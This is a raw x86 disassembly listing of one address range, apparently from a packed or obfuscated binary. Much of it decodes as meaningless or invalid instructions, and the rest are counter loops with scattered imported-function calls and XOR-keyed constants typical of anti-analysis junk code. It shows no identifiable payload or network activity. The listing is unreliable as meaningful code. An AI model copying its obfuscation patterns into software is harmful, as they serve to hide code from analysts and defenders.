  404844:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404845:	push   ebx
  404846:	pop    ss
  404847:	cdq    
  404848:	gs movs DWORD PTR es:[edi],DWORD PTR ss:[esi]
  40484b:	cmp    DWORD PTR [edx],ecx
  40484d:	jecxz  0x40483c
  40484f:	jb     0x4048b1
  404851:	jmp    0x40487f
  404853:	mov    cs,WORD PTR [edi+0x8]
  404856:	das    
  404857:	and    dh,BYTE PTR [eax+ebx*2-0x5f15b1b5]
  40485e:	jnp    0x4048b1
  404860:	jl     0x404868
  404862:	push   ecx
  404863:	in     eax,dx
  404864:	inc    edi
  404865:	repz js 0x40484f
  404868:	clc    
  404869:	cmp    DWORD PTR [edi+ebx*4-0x69],esp
  40486d:	mov    edi,0xba0ae71a
  404872:	out    dx,al
  404873:	fild   QWORD PTR ds:0x158d
  404878:	push   ss
  404879:	cli    
  40487a:	fcmovnb st,st(5)
  40487c:	sbb    DWORD PTR [ebx+0x6f],ebp
  40487f:	rcl    DWORD PTR [ebx-0x732b9dd7],cl
  404885:	(bad)  [edx+0x5a1fd09f]
  40488b:	lea    ebp,[ebp-0x43]
  40488e:	dec    eax
  40488f:	xchg   ebp,eax
  404890:	int3   
  404891:	sub    al,0x35
  404893:	not    BYTE PTR [ebp*1+0x35824e51]
  40489a:	mov    ebp,0xfa416427
  40489f:	jg     0x4048ca
  4048a1:	pop    eax
  4048a2:	ret    
  4048a3:	pop    esp
  4048a4:	jmp    0x290b:0xd148de10
  4048ab:	push   cs
  4048ac:	enter  0x8bd7,0xe0
  4048b0:	enter  0xcd04,0xa5
  4048b4:	xchg   ah,ah
  4048b6:	inc    esp
  4048b7:	stos   BYTE PTR es:[edi],al
  4048b8:	and    DWORD PTR [eax],edx
  4048ba:	add    ecx,DWORD PTR [edi+0x50]
  4048bd:	mov    BYTE PTR [ecx],cl
  4048bf:	or     eax,DWORD PTR [edx]
  4048c1:	pop    edi
  4048c2:	mov    eax,ds:0xdae6f16b
  4048c7:	stc    
  4048c8:	div    BYTE PTR [esi+eax*8]
  4048cb:	push   ds
  4048cc:	fst    st(1)
  4048ce:	ret    
  4048cf:	dec    esi
  4048d0:	daa    
  4048d1:	jb     0x404925
  4048d3:	out    dx,al
  4048d4:	add    al,0xb0
  4048d6:	cmp    BYTE PTR [esi],dh
  4048d8:	dec    edx
  4048d9:	sub    bh,ch
  4048db:	dec    ecx
  4048dc:	cwde   
  4048dd:	rcl    DWORD PTR [ebx],1
  4048df:	push   ebx
  4048e0:	cli    
  4048e1:	ja     0x4048f7
  4048e3:	rcr    esi,0xad
  4048e6:	push   ss
  4048e7:	clc    
  4048e8:	mov    ah,0xda
  4048ea:	sub    eax,0x5aed4e0e
  4048ef:	pop    esi
  4048f0:	jl     0x40494e
  4048f2:	loope  0x404932
  4048f4:	aas    
  4048f5:	adc    ebx,ecx
  4048f7:	cmp    bh,ch
  4048f9:	(bad)  
  4048fa:	enter  0x82d5,0x85
  4048fe:	(bad)  
  4048ff:	sub    BYTE PTR [esi],ah
  404901:	call   0x548:0xd1495ce9
  404908:	xor    edi,DWORD PTR [edx]
  40490a:	stc    
  40490b:	xor    al,0x6a
  40490d:	mov    ebp,0x41e4f363
  404912:	adc    al,0x53
  404914:	rcl    DWORD PTR [edi-0xc],cl
  404917:	out    dx,eax
  404918:	ins    DWORD PTR es:[edi],dx
  404919:	je     0x4048aa
  40491b:	(bad)  
  40491c:	mov    bh,0x43
  40491e:	leave  
  40491f:	in     al,0xf1
  404921:	into   
  404922:	les    edi,FWORD PTR [ebp-0x29]
  404925:	(bad)  
  404926:	retf   
  404927:	fldenv ss:[edx+0x41]
  40492b:	xlat   BYTE PTR ds:[ebx]
  40492c:	std    
  40492d:	addr16 in al,dx
  40492f:	add    BYTE PTR gs:[edx+0x45],ah
  404933:	sbb    eax,0xffffff87
  404936:	or     si,WORD PTR [esi*8+0x40126840]
  40493e:	stos   BYTE PTR es:[edi],al
  40493f:	repnz inc ebp
  404941:	imul   eax,eax,0x22
  404944:	cmc    
  404945:	ret    
  404946:	mov    edx,0xfba4dda1
  40494b:	test   DWORD PTR [esi-0x61b65ff0],edi
  404951:	in     al,dx
  404952:	neg    BYTE PTR [ebp+ecx*4-0x52e90662]
  404959:	mov    eax,0xe98ea214
  40495e:	ror    DWORD PTR [edx+0x39],1
  404961:	in     al,dx
  404962:	aaa    
  404963:	fild   WORD PTR [eax]
  404965:	sahf   
  404966:	hlt    
  404967:	pop    ebx
  404968:	xor    bh,BYTE PTR [ebp-0x506485fa]
  40496e:	ds arpl di,ax
  404971:	clc    
  404972:	mov    ecx,0x9bbdaced
  404977:	mov    eax,0x127336d5
  40497c:	icebp  
  40497d:	in     eax,dx
  40497e:	xor    BYTE PTR [ecx+0x6b],dl
  404981:	dec    edi
  404982:	iret   
  404983:	je     0x4049c3
  404985:	inc    edx
  404986:	jle    0x404998
  404988:	xchg   ecx,eax
  404989:	pop    edx
  40498a:	pop    ecx
  40498b:	push   edi
  40498c:	sub    BYTE PTR [esi],0x39
  40498f:	jg     0x404982
  404991:	fcom   QWORD PTR [edx]
  404993:	jnp    0x4049af
  404995:	aaa    
  404996:	push   ebp
  404997:	aas    
  404998:	(bad)  
  404999:	push   ebx
  40499a:	imul   eax,DWORD PTR [esi+0x75d260d0],0xe512396a
  4049a4:	aaa    
  4049a5:	mov    ecx,DWORD PTR [esi+0x76f1d443]
  4049ab:	adc    eax,0x3d4c3dbe
  4049b0:	mov    ch,0xf3
  4049b2:	js     0x404957
  4049b4:	and    eax,0xe98c815f
  4049b9:	push   ebx
  4049ba:	ret    0xccfe
  4049bd:	cmp    BYTE PTR [eax-0x6a],0xae
  4049c1:	gs dec esi
  4049c3:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4049c5:	js     0x4049f7
  4049c7:	hlt    
  4049c8:	jp     0x4049e5
  4049ca:	xchg   esp,eax
  4049cb:	mov    al,ds:0xa2eb22a6
  4049d0:	pop    esp
  4049d1:	fild   WORD PTR [ecx-0x1d]
  4049d4:	jae    0x40498d
  4049d6:	mul    bl
  4049d8:	add    eax,0x64892d1c
  4049dd:	xlat   BYTE PTR ds:[ebx]
  4049de:	add    al,0x3a
  4049e0:	ficomp DWORD PTR [ecx+0x35005089]
  4049e6:	aam    0xbb
  4049e8:	mov    edx,0x73ad7d24
  4049ed:	shl    ah,0x10
  4049f0:	es (bad) 
  4049f2:	mov    WORD PTR [ebx+eiz*4+0x1e136219],?
  4049f9:	frstor [ebp+0x499a801e]
  4049ff:	out    0xaf,al
  404a01:	das    
  404a02:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404a03:	add    BYTE PTR [edx],ch
  404a05:	push   edi
  404a06:	cmc    
  404a07:	mov    es,edi
  404a09:	pop    es
  404a0a:	fsub   st(5),st
  404a0c:	mov    edx,0x2cc59662
  404a11:	jle    0x4049c4
  404a13:	xlat   BYTE PTR ds:[ebx]
  404a14:	add    al,0xb8
  404a16:	sbb    al,0x37
  404a18:	inc    esp
  404a19:	pop    ecx
  404a1a:	inc    esi
  404a1b:	jnp    0x4049f1
  404a1d:	add    dh,al
  404a1f:	lds    ebx,FWORD PTR [esi-0x6ed4efa0]
  404a25:	push   esi
  404a26:	sub    eax,0xff49082
  404a2b:	(bad)
  404a2e:	fwait
  404a2f:	mov    dh,0x35
  404a31:	fdivr  DWORD PTR [ecx+0x7e]
  404a34:	loope  0x404a9a
  404a36:	shr    BYTE PTR [edx+0x60],cl
  404a39:	inc    esi
  404a3a:	fisttp DWORD PTR [ebp+edi*8-0x14]
  404a3e:	data16 cmp BYTE PTR [edx-0x1b],bh
  404a42:	pop    es
  404a43:	test   BYTE PTR [eax],dh
  404a45:	retf   
  404a46:	xor    BYTE PTR [eax],bl
  404a48:	push   0xf47fca49
  404a4d:	push   ss
  404a4e:	(bad)  
  404a4f:	je     0x4049f3
  404a51:	leave  
  404a52:	xchg   BYTE PTR [edx+0x48],cl
  404a55:	adc    BYTE PTR [ebx-0x553c793b],dl
  404a5b:	stos   DWORD PTR es:[edi],eax
  404a5c:	jp     0x404a6e
  404a5e:	pop    esi
  404a5f:	leave  
  404a60:	jae    0x404a74
  404a62:	jne    0x404adb
  404a64:	or     BYTE PTR [ebp+0x3a658e33],cl
  404a6a:	xchg   DWORD PTR [eax-0x25],ecx
  404a6d:	xchg   edx,eax
  404a6e:	call   0x55c3:0xc95b5e5f
  404a75:	mov    ebp,esp
  404a77:	sub    esp,0x2c
  404a7a:	leave  
  404a7b:	ret    0x10
  404a7e:	push   ebp
  404a7f:	mov    ebp,esp
  404a81:	sub    esp,0x44
  404a84:	adc    DWORD PTR ds:0x43373f,edi
  404a8a:	push   edi
  404a8b:	mov    eax,DWORD PTR [ebp+0xc]
  404a8e:	mov    edx,DWORD PTR ds:0x4336b7
  404a94:	and    DWORD PTR ds:0x433703,edx
  404a9a:	mov    DWORD PTR [ebp-0x10],eax
  404a9d:	adc    DWORD PTR ds:0x43362b,0x2679
  404aa7:	mov    eax,DWORD PTR [ebp+0x8]
  404aaa:	xor    ecx,DWORD PTR ds:0x43366b
  404ab0:	mov    DWORD PTR [ebp+0x8],0xf89c8531
  404ab7:	mov    DWORD PTR ds:0x43372b,0x7030
  404ac1:	mov    DWORD PTR [ebp-0x20],0xf89c8532
  404ac8:	and    DWORD PTR ds:0x4336c3,0x0
  404ad2:	mov    edi,DWORD PTR ds:0x4336c3
  404ad8:	inc    edi
  404ad9:	mov    DWORD PTR ds:0x4336c3,edi
  404adf:	cmp    DWORD PTR ds:0x4336c3,0x6
  404ae6:	jne    0x404af5
  404aec:	push   DWORD PTR [ebp-0x18]
  404aef:	call   DWORD PTR ds:0x412358
  404af5:	cmp    DWORD PTR ds:0x4336c3,0x5
  404afc:	jne    0x404b0f
  404b02:	mov    edi,DWORD PTR ds:0x4336c3
  404b08:	inc    edi
  404b09:	mov    DWORD PTR ds:0x4336c3,edi
  404b0f:	cmp    DWORD PTR ds:0x4336c3,0x14
  404b16:	jb     0x404ad2
  404b1c:	jmp    0x404e76
  404b21:	push   ecx
  404b22:	mov    esi,0xf1913591
  404b27:	jno    0x404b83
  404b29:	ins    DWORD PTR es:[edi],dx
  404b2a:	inc    ebp
  404b2b:	fild   WORD PTR [ecx-0xedf9fd8]
  404b31:	xor    ebp,DWORD PTR ds:0x7d337e7e
  404b37:	jle    0x404bb7
  404b39:	push   edx
  404b3a:	int3   
  404b3b:	ins    DWORD PTR es:[edi],dx
  404b3c:	out    dx,eax
  404b3d:	(bad)  
  404b3e:	mov    al,ds:0x44b81832
  404b43:	xchg   ebp,eax
  404b44:	and    eax,0x9ed13d0c
  404b49:	xchg   edi,eax
  404b4a:	lods   al,BYTE PTR ds:[esi]
  404b4b:	cmp    DWORD PTR ds:[edi+0x7f54a192],ebx
  404b52:	mov    ecx,DWORD PTR [ecx]
  404b54:	sti    
  404b55:	lods   al,BYTE PTR ds:[esi]
  404b56:	push   es
  404b57:	retf   
  404b58:	xor    esi,ebp
  404b5a:	(bad)  
  404b5b:	cmp    esp,DWORD PTR [ebx-0x303185af]
  404b61:	pop    es
  404b62:	fs nop
  404b64:	inc    eax
  404b65:	jmp    0x253c:0x5db61593
  404b6c:	mov    bh,al
  404b6e:	repz push ebp
  404b70:	xchg   edx,eax
  404b71:	lea    edx,[edx+edi*8+0x74055903]
  404b78:	adc    DWORD PTR [eax-0x12],edi
  404b7b:	cmp    ah,BYTE PTR [eax+eax*8-0xa5aa0e6]
  404b82:	cli    
  404b83:	xchg   esp,eax
  404b84:	ret    
  404b85:	jnp    0x404b69
  404b87:	mov    dl,0x3c
  404b89:	nop
  404b8a:	sub    al,0xf0
  404b8c:	fsubr  DWORD PTR [ecx]
  404b8e:	retf   0x36f4
  404b91:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404b92:	jp     0x404b1f
  404b94:	shl    DWORD PTR [ecx],cl
  404b96:	daa    
  404b97:	mov    ah,0x9d
  404b99:	ins    DWORD PTR es:[edi],dx
  404b9a:	push   eax
  404b9b:	xchg   ecx,eax
  404b9c:	clc    
  404b9d:	cdq    
  404b9e:	mov    bh,0xd5
  404ba0:	mov    al,ds:0x2b8f1efa
  404ba5:	aad    0x8c
  404ba7:	iret   
  404ba8:	call   0xc7b9:0xb1b20477
  404baf:	mov    ah,0xfe
  404bb1:	repz mov ah,0xf4
  404bb4:	and    BYTE PTR [esi-0x73],dh
  404bb7:	xchg   BYTE PTR [esi+eiz*2],cl
  404bba:	add    edi,ebp
  404bbc:	scas   al,BYTE PTR es:[edi]
  404bbd:	pusha  
  404bbe:	ror    edx,1
  404bc0:	jecxz  0x404c09
  404bc2:	int    0x65
  404bc4:	leave  
  404bc5:	scas   al,BYTE PTR es:[edi]
  404bc6:	jnp    0x404c0b
  404bc8:	icebp  
  404bc9:	aaa    
  404bca:	jns    0x404b88
  404bcc:	add    ah,BYTE PTR [ecx]
  404bce:	gs in  eax,0x3a
  404bd1:	les    ebx,FWORD PTR ds:0x10ddbd25
  404bd7:	out    0xa,eax
  404bd9:	pop    esi
  404bda:	xchg   esi,eax
  404bdb:	fwait
  404bdc:	xor    DWORD PTR [eax],ebx
  404bde:	in     al,dx
  404bdf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404be0:	retf   0xd367
  404be3:	cmp    esi,ebx
  404be5:	in     eax,dx
  404be6:	mov    esi,0x6f22c204
  404beb:	in     al,0x2
  404bed:	stc    
  404bee:	dec    esp
  404bef:	cmp    BYTE PTR [ebp-0x4a],ch
  404bf2:	push   ecx
  404bf3:	pop    esi
  404bf4:	ret    0x34bc
  404bf7:	loop   0x404b87
  404bf9:	xor    DWORD PTR [esi],edi
  404bfb:	pop    ebx
  404bfc:	shl    DWORD PTR [edx-0x68e493e6],0xf
  404c03:	add    eax,0xf81ebeee
  404c08:	mov    ds:0x55a7e1e0,eax
  404c0d:	ins    DWORD PTR es:[edi],dx
  404c0e:	pop    esp
  404c0f:	push   edi
  404c10:	mov    ebp,0x820afbad
  404c15:	shr    BYTE PTR [ecx],0xb0
  404c18:	lds    esp,FWORD PTR [edx]
  404c1a:	dec    edx
  404c1b:	arpl   WORD PTR [edi+ebp*4+0x7],ax
  404c1f:	jge    0x404c24
  404c21:	jl     0x404ba3
  404c23:	sbb    edx,DWORD PTR [edx-0x10]
  404c26:	imul   edi,DWORD PTR [edi-0x1ad3310a],0x520cf9b0
  404c30:	mov    cl,BYTE PTR ds:0xd2746fe5
  404c36:	push   ebx
  404c37:	je     0x404c8d
  404c39:	sbb    dl,bh
  404c3b:	xlat   BYTE PTR ds:[ebx]
  404c3c:	add    DWORD PTR [esi+0x757b759a],0x31
  404c43:	test   dl,ah
  404c45:	(bad)  
  404c46:	adc    edi,DWORD PTR [ebx+0x73]
  404c49:	mov    ebx,0x8d709573
  404c4e:	mov    cl,0x83
  404c50:	push   cs
  404c51:	mov    ch,0x7
  404c53:	jns    0x404c08
  404c55:	(bad)  
  404c56:	cmc    
  404c57:	repnz mov ecx,0xb941f933
  404c5d:	mov    dh,dl
  404c5f:	sbb    al,0x68
  404c61:	sub    edx,edx
  404c63:	(bad)  
  404c66:	lods   eax,DWORD PTR ds:[esi]
  404c67:	inc    edi
  404c68:	(bad)  
  404c69:	and    al,bh
  404c6b:	push   edx
  404c6c:	enter  0xe45b,0x4c
  404c70:	pop    eax
  404c71:	pop    ebp
  404c72:	lahf   
  404c73:	jmp    DWORD PTR ds:0x808b5a4d
  404c79:	or     BYTE PTR [ecx+0x3b],al
  404c7c:	out    dx,eax
  404c7d:	int    0x26
  404c7f:	adc    eax,0x749b023c
  404c84:	ret    0xb2fd
  404c87:	repz sti 
  404c89:	mov    cl,BYTE PTR [edi+0x75c25d5b]
  404c8f:	jno    0x404cde
  404c91:	scas   eax,DWORD PTR es:[edi]
  404c92:	and    ah,BYTE PTR [edi-0xeaf5009]
  404c98:	push   eax
  404c99:	test   edi,ebp
  404c9b:	enter  0x1dac,0xaf
  404c9f:	dec    esp
  404ca0:	pop    ebx
  404ca1:	xor    DWORD PTR [eax+eax*8],0xc3ae7294
  404ca8:	mov    bh,0x39
  404caa:	pop    edi
  404cab:	cmp    BYTE PTR [edx],dh
  404cad:	das    
  404cae:	or     ebp,esi
  404cb0:	icebp  
  404cb1:	imul   esp,DWORD PTR ds:0xddf70679,0x7d93fd86
  404cbb:	mov    ch,0x7a
  404cbd:	jne    0x404cdc
  404cbf:	cmc    
  404cc0:	push   0x6d
  404cc2:	mov    al,0xb8
  404cc4:	xor    al,0xaf
  404cc6:	repnz dec esi
  404cc8:	ror    DWORD PTR [esi-0xe12e181],cl
  404cce:	fwait
  404ccf:	int    0xb4
  404cd1:	jle    0x404d38
  404cd3:	and    BYTE PTR [ebx-0x6e],ah
  404cd6:	adc    al,0xcd
  404cd8:	jl     0x404cb3
  404cda:	in     eax,dx
  404cdb:	mov    eax,0x9d368810
  404ce0:	sbb    BYTE PTR [edx+edx*2],ch
  404ce3:	cmp    al,0xca
  404ce5:	enter  0x4c1f,0x4d
  404ce9:	js     0x404d31
  404ceb:	lods   eax,DWORD PTR ds:[esi]
  404cec:	xor    dh,BYTE PTR [eax-0x5b]
  404cef:	xor    eax,0x66843e1e
  404cf4:	sbb    eax,0x99e143a5
  404cf9:	sbb    ch,ch
  404cfb:	mov    bl,0xbf
  404cfd:	xor    dh,BYTE PTR [edi+edx*4-0xf]
  404d01:	and    dh,BYTE PTR [eax]
  404d03:	mov    ecx,0xf00ce4ac
  404d08:	mov    ebp,0x3ddd6b05
  404d0d:	sbb    BYTE PTR [edi+0xb],0x1
  404d11:	pop    DWORD PTR [edx-0x45]
  404d14:	push   ebp
  404d15:	adc    DWORD PTR [ebx],esp
  404d17:	je     0x404cf3
  404d19:	in     eax,dx
  404d1a:	(bad)  
  404d1b:	in     eax,0x4c
  404d1d:	push   esp
  404d1e:	inc    ecx
  404d1f:	add    ebp,0x69cca556
  404d25:	inc    edx
  404d26:	push   esp
  404d27:	xlat   BYTE PTR ds:[ebx]
  404d28:	mov    edx,0xb65143d1
  404d2d:	mov    bl,0x7d
  404d2f:	sbb    bh,BYTE PTR [ecx-0x2be79ab1]
  404d35:	test   eax,0x2ad219ca
  404d3a:	ds jmp 0xb6d5:0x253af6cb
  404d42:	loop   0x404cf0
  404d44:	popf   
  404d45:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404d46:	mov    ch,0xd6
  404d48:	xor    eax,0xfda69db3
  404d4d:	enter  0xac5a,0x8c
  404d51:	add    eax,0x15eaaad2
  404d56:	pop    esi
  404d57:	or     BYTE PTR [ecx+esi*4],0x86
  404d5b:	mov    ah,0xf2
  404d5d:	jg     0x404d03
  404d5f:	xchg   edi,eax
  404d60:	fcmovnb st,st(3)
  404d62:	mov    ah,0x21
  404d64:	ins    BYTE PTR es:[edi],dx
  404d65:	pop    ebp
  404d66:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404d67:	push   es
  404d68:	dec    eax
  404d69:	push   ebx
  404d6a:	lea    ecx,[edx]
  404d6c:	test   cl,ah
  404d6e:	adc    ebp,DWORD PTR [edx+eiz*2+0x33ff0b49]
  404d75:	ror    cl,0xc8
  404d78:	sub    eax,0x348d5581
  404d7d:	popf   
  404d7e:	sbb    ebp,DWORD PTR gs:[esi+ebp*2]
  404d82:	lock sti 
  404d84:	retf   0x9184
  404d87:	dec    edi
  404d88:	imul   ebp,DWORD PTR cs:[eax+0x3d],0xedda81b0
  404d90:	push   esp
  404d91:	jecxz  0x404d94
  404d93:	pop    ebx
  404d94:	jae    0x404dd8
  404d96:	imul   edi,DWORD PTR [eax+esi*1+0x440f8593],0xfb5a80c5
  404da1:	ss sahf 
  404da3:	enter  0xd99f,0x45
  404da7:	push   0x24fe7be2
  404dac:	or     cl,dh
  404dae:	mov    bh,0x47
  404db0:	mov    ecx,0x3c405fdf
  404db5:	mov    ?,WORD PTR [edi]
  404db7:	and    BYTE PTR [esp+ebp*1+0x7e5cb8a1],ch
  404dbe:	push   ebp
  404dbf:	mov    cl,0xc6
  404dc1:	mov    dl,0x51
  404dc3:	pop    esp
  404dc4:	inc    esp
  404dc5:	mov    bh,0x9c
  404dc7:	adc    al,BYTE PTR [ebx]
  404dc9:	inc    ebx
  404dca:	sub    eax,0x8c36517a
  404dcf:	mul    BYTE PTR [edx-0x2e61bce1]
  404dd5:	out    dx,al
  404dd6:	adc    ebx,DWORD PTR [ebx+0x42]
  404dd9:	dec    esp
  404dda:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404ddb:	xlat   BYTE PTR ds:[ebx]
  404ddc:	mov    dl,0x15
  404dde:	arpl   dx,sp
  404de0:	sbb    BYTE PTR [eax-0x22],dh
  404de3:	xor    al,0x6d
  404de5:	data16 or al,0x64
  404de8:	pop    esp
  404de9:	push   ds
  404dea:	push   esi
  404deb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404dec:	psubusw mm4,QWORD PTR [esi+0x42]
  404df0:	sub    ecx,ebx
  404df2:	push   ecx
  404df3:	lea    ebx,[edx-0x2ff1e1eb]
  404df9:	xlat   BYTE PTR ds:[ebx]
  404dfa:	ins    DWORD PTR es:[edi],dx
  404dfb:	push   ss
  404dfc:	sub    BYTE PTR [ebx-0x112bf8d8],al
  404e02:	outs   dx,DWORD PTR ds:[esi]
  404e03:	inc    esi
  404e04:	cmp    al,0x91
  404e06:	sti    
  404e07:	sbb    bh,ah
  404e09:	sub    al,0x45
  404e0b:	pop    edx
  404e0c:	adc    eax,0xce04e448
  404e11:	test   eax,0xd108f00c
  404e16:	(bad)  
  404e18:	aas    
  404e19:	pop    ebp
  404e1a:	xor    eax,0xb8be93a4
  404e1f:	cld    
  404e20:	sahf   
  404e21:	ins    BYTE PTR es:[edi],dx
  404e22:	push   eax
  404e23:	inc    edx
  404e24:	jno    0x404e05
  404e26:	dec    edi
  404e27:	or     al,0xba
  404e29:	jecxz  0x404dd0
  404e2b:	mov    edi,0x40d867c
  404e30:	mov    esi,0x113b1e0b
  404e35:	sbb    edi,DWORD PTR [edi+0x34]
  404e38:	fwait
  404e39:	stc    
  404e3a:	pop    edi
  404e3b:	(bad)  
  404e3c:	and    al,ah
  404e3e:	or     eax,DWORD PTR [edi+edi*8]
  404e41:	add    DWORD PTR [ebx-0x4ab26acb],0x49
  404e48:	and    al,0x2f
  404e4a:	mov    al,ds:0x3bfa4d39
  404e4f:	push   ecx
  404e50:	pop    ds
  404e51:	add    eax,0x184f3901
  404e56:	lock scas al,BYTE PTR es:[edi]
  404e58:	dec    eax
  404e59:	loop   0x404e84
  404e5b:	mov    edi,0x1c94b12c
  404e60:	cmc    
  404e61:	call   0xb0918a96
  404e66:	gs aaa 
  404e68:	add    dh,BYTE PTR ds:0x198e4729
  404e6e:	mov    dl,0xea
  404e70:	scas   eax,DWORD PTR es:[edi]
  404e71:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404e72:	out    dx,eax
  404e73:	popa   
  404e74:	inc    edi
  404e75:	jno    0x404e02
  404e77:	push   ebp
  404e78:	or     BYTE PTR [ecx+0x7359d1],al
  404e7e:	add    BYTE PTR [ecx+0x54b8c045],cl
  404e84:	or     BYTE PTR [ecx+0x7],dl
  404e87:	xor    edx,eax
  404e89:	adc    DWORD PTR ds:0x43361b,0x3221
  404e93:	mov    ecx,0x32729b
  404e98:	mov    edi,DWORD PTR ds:0x4336e7
  404e9e:	adc    DWORD PTR ds:0x43367f,edi
  404ea4:	add    edx,ecx
  404ea6:	neg    edi
  404ea8:	mov    DWORD PTR [ebp-0x8],edx
  404eab:	mov    DWORD PTR ds:0x4336eb,0x10
  404eb5:	cmp    DWORD PTR ds:0x4336eb,0x0
  404ebc:	je     0x404f14
  404ec2:	cmp    DWORD PTR ds:0x4336eb,0x9
  404ec9:	jne    0x404ee2
  404ecf:	push   0x6f04
  404ed4:	push   0x5d47
  404ed9:	push   DWORD PTR [ebp-0x1c]
  404edc:	call   DWORD PTR ds:0x41235c
  404ee2:	cmp    DWORD PTR ds:0x4336eb,0xa
  404ee9:	jne    0x404efc
  404eef:	mov    edi,DWORD PTR ds:0x4336eb
  404ef5:	dec    edi
  404ef6:	mov    DWORD PTR ds:0x4336eb,edi
  404efc:	mov    edi,DWORD PTR ds:0x4336eb
  404f02:	dec    edi
  404f03:	mov    DWORD PTR ds:0x4336eb,edi
  404f09:	jmp    0x404eb5
  404f0e:	and    DWORD PTR ds:0x43373f,ecx
  404f14:	mov    edx,DWORD PTR [ebp+0x8]
  404f17:	sbb    edi,DWORD PTR ds:0x4336eb
  404f1d:	xor    edx,eax
  404f1f:	sbb    edi,DWORD PTR ds:0x4336bf
  404f25:	add    edx,ecx
  404f27:	and    DWORD PTR ds:0x43373b,0x0
  404f31:	xor    edi,edi
  404f33:	add    edi,DWORD PTR ds:0x43373b
  404f39:	inc    edi
  404f3a:	mov    DWORD PTR ds:0x43373b,edi
  404f40:	cmp    DWORD PTR ds:0x43373b,0xc
  404f47:	jne    0x404f58
  404f4d:	push   0x3fd8
  404f52:	call   DWORD PTR ds:0x412000
  404f58:	cmp    DWORD PTR ds:0x43373b,0xb
  404f5f:	jne    0x404f72
  404f65:	mov    edi,DWORD PTR ds:0x43373b
  404f6b:	inc    edi
  404f6c:	mov    DWORD PTR ds:0x43373b,edi
  404f72:	cmp    DWORD PTR ds:0x43373b,0x17
  404f79:	jb     0x404f31
  404f7f:	mov    DWORD PTR [ebp+0xc],edx
  404f82:	mov    DWORD PTR ds:0x433637,0x5f27
  404f8c:	mov    DWORD PTR [ebp-0x4],0xf89c85d1
  404f93:	xor    DWORD PTR ds:0x433667,edi
  404f99:	mov    DWORD PTR [ebp-0x28],0xf89c8533
  404fa0:	mov    DWORD PTR [ebp-0x2c],0xf89c853c
  404fa7:	sbb    DWORD PTR ds:0x4336ef,edi
  404fad:	mov    DWORD PTR [ebp-0x30],0xf89c853d
  404fb4:	adc    DWORD PTR ds:0x43360f,ecx
  404fba:	mov    DWORD PTR [ebp-0x34],0xf89c853e
  404fc1:	movzx  edi,WORD PTR ds:0x433667
  404fc8:	and    DWORD PTR ds:0x433613,edi
  404fce:	mov    DWORD PTR [ebp-0x38],0xf89c853f
  404fd5:	dec    edx
  404fd6:	mov    DWORD PTR [ebp-0x3c],0xf89c8538
  404fdd:	mov    edx,DWORD PTR [ebp+0x8]
  404fe0:	add    DWORD PTR ds:0x4336e7,ebx
  404fe6:	xor    edx,eax
  404fe8:	add    edi,0x469e
  404fee:	mov    edi,DWORD PTR [ebp-0x10]
  404ff1:	add    edx,ecx
  404ff3:	cmp    edi,edx
  404ff5:	mov    DWORD PTR ds:0x43372f,0x53a
  404fff:	je     0x40685f
  405005:	mov    DWORD PTR ds:0x433737,0x2c13
  40500f:	push   ebx
  405010:	mov    DWORD PTR ds:0x4336ef,0x2429
  40501a:	jmp    0x40683a
  40501f:	mov    edx,DWORD PTR [ebp-0x8]
  405022:	and    DWORD PTR ds:0x433627,0x0
  40502c:	mov    edi,DWORD PTR ds:0x433627
  405032:	inc    edi
  405033:	mov    DWORD PTR ds:0x433627,edi
  405039:	cmp    DWORD PTR ds:0x433627,0x6
  405040:	jne    0x40505d
  405046:	push   DWORD PTR [ebp-0x14]
  405049:	push   DWORD PTR [ebp-0x10]
  40504c:	push   DWORD PTR [ebp-0xc]
  40504f:	push   DWORD PTR [ebp-0x18]
  405052:	push   0x82f7
  405057:	call   DWORD PTR ds:0x41236c
  40505d:	cmp    DWORD PTR ds:0x433627,0x5
  405064:	jne    0x405079
  40506a:	xor    edi,edi
  40506c:	xor    edi,DWORD PTR ds:0x433627
  405072:	inc    edi
  405073:	mov    DWORD PTR ds:0x433627,edi
  405079:	cmp    DWORD PTR ds:0x433627,0x17
  405080:	jb     0x40502c
  405086:	xor    edi,edi
  405088:	add    edi,DWORD PTR ds:0x4336ff
  40508e:	add    DWORD PTR ds:0x4336bb,edi
  405094:	mov    edi,DWORD PTR [ebp-0x10]
  405097:	sub    edi,edx
  405099:	mov    edx,DWORD PTR [ebp-0x4]
  40509c:	xor    edx,eax
  40509e:	add    edx,ecx
  4050a0:	mov    DWORD PTR ds:0x4336eb,0x78fa
  4050aa:	cmp    edi,edx
  4050ac:	mov    DWORD PTR ds:0x43373b,0x49ec
  4050b6:	jb     0x40685e
  4050bc:	mov    edx,DWORD PTR [ebp-0x28]
  4050bf:	mov    edi,DWORD PTR [ebp-0x4]
  4050c2:	xor    edx,eax
  4050c4:	inc    DWORD PTR ds:0x43373b
  4050ca:	xor    edi,eax
  4050cc:	not    DWORD PTR ds:0x4336fb
  4050d2:	add    edi,ecx
  4050d4:	add    edx,ecx
  4050d6:	adc    ebx,0x69d8
  4050dc:	imul   edx,edi
  4050df:	mov    edi,DWORD PTR [ebp-0x8]
  4050e2:	mov    ebx,DWORD PTR [ebp-0x10]
  4050e5:	sbb    DWORD PTR ds:0x433627,0x4336b7
  4050ef:	sub    ebx,edi
  4050f1:	mov    DWORD PTR ds:0x43361f,0x4726
  4050fb:	cmp    ebx,edx
  4050fd:	mov    DWORD PTR ds:0x4336eb,0x2e42
  405107:	ja     0x4054d4
  40510d:	and    DWORD PTR ds:0x4336ff,0x0
  405117:	jmp    0x40512b
  40511c:	xor    edx,edx
  40511e:	add    edx,DWORD PTR ds:0x4336ff
  405124:	inc    edx
  405125:	mov    DWORD PTR ds:0x4336ff,edx
  40512b:	cmp    DWORD PTR ds:0x4336ff,0x17
  405132:	jae    0x40515a
  405138:	cmp    DWORD PTR ds:0x4336ff,0x18
  40513f:	jne    0x405155
  405145:	push   0x19d0
  40514a:	push   0x338d
  40514f:	call   DWORD PTR ds:0x412004
